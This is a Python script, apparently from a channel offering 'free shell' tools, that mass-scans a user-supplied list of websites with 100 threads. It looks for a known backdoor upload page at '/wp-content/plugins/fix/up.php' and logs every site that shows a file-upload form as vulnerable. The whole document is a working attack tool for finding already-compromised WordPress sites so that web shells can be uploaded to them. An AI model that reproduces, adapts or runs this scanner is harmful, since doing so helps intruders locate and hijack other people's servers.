from socket import timeout
import requests
import re
from multiprocessing.dummy import Pool
head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
from colorama import Fore
from colorama import Style
from colorama import init
from time import sleep
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT

#FROM t.me/freeshelltool @v3t4l1 


def finder(i) :
    try :
        list_users = ['/wp-content/plugins/fix/up.php']
        for ma in list_users :
            url = 'http://'+i+'/'+ma
            check = requests.get(url, timeout=3, headers=head).text
            if '<input type="file" name="fileToUpload" id="fileToUpload">' in check :
                print(fg+'vuln => '+i)
                open('vuln.txt','a').write(url+'\n')
            else:
                print(fr+'Not Vuln => '+i)
    except :
        pass
def main() :
    ad =  input('Website : ')
    oppp = open(ad, 'r',errors='ignore').read().splitlines()
    deadcode = Pool(int(100))
    deadcode.map(finder, oppp)
main()

